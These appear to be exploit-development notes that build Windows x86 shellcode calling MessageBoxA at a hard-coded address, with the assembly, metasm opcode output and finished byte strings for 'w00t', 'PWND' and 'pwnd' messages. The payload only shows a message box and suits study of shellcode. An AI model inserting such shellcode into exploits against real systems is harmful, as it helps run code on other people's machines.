C:\WINDOWS\system32>arwin.exe user32 MessageBoxA
arwin - win32 address resolution program - by steve hanna - v.01
MessageBoxA is located at 0x7e4507ea in user32

MessageBoxA - User32: 0x7E4507EA

xor eax, eax ; Need to zero-out eax first to null terminate the string so the messageBox isn't trailed by any special chars
push eax ; Push the null terminating string to stack
mov ebx, 0x00584148 ; Loads a null-terminated string "HAX" to ebx
push ebx ; pushes ebx to the stack
mov esi, esp ; saves null-terminated string "HAX" in esi
xor eax, eax ; Zero our eax (eax=0)
push eax ; Push the fourth parameter (uType) to the stack (value 0)
push esi ; Push the third parameter (lpCaption) to the stack (value HAX\00)
push esi ; Push the second parameter (lpText) to the stack (value HAX\00)
push eax ; Push the first parameter (hWnd) to the stack (value 0)
mov eax, 0x7E4507EA ; Move the MessageBoxA address in to eax
call eax ; Call the MessageBoxA function with all parameters supplied.


egg = "w00t" #\x77\x30\x30\x74
\x77 - w
\x0 - 30
\x0 - 30
\x74 - t

#msf-metasm_shell
metasm > xor eax, eax
"\x31\xc0"
metasm > push eax
"\x50"
metasm > mov ebx, 0x74303077
"\xbb\x77\x30\x30\x74"
metasm > push ebx
"\x53"
metasm > mov esi, esp
"\x89\xe6"
metasm > xor eax, eax
"\x31\xc0"
metasm > push eax
"\x50"
metasm > push esi
"\x56"
metasm > push esi
"\x56"
metasm > push eax
"\x50"
metasm > mov eax, 0x7E4507EA
"\xb8\xea\x07\x45\x7e"
metasm > call eax
"\xff\xd0"
metasm > 

Shellcode with "w00t" as message:
"\x31\xc0\x50\xbb\x77\x30\x30\x74\x53\x89\xe6\x31\xc0\x50\x56\x56\x50\xb8\xea\x07\x45\x7e\xff\xd0"

Shellcode with "PWND" as message:
"\x31\xc0\x50\xbb\x50\x57\x4E\x44\x53\x89\xe6\x31\xc0\x50\x56\x56\x50\xb8\xea\x07\x45\x7e\xff\xd0"

Shellcode with "pwnd" as message:
"\x31\xc0\x50\xbb\x70\x77\x6E\x64\x53\x89\xe6\x31\xc0\x50\x56\x56\x50\xb8\xea\x07\x45\x7e\xff\xd0"

All the opcodes are written into the exploit in order. Only the text string that is used for the message and title is reversed.
i.e. w00t --> t00w
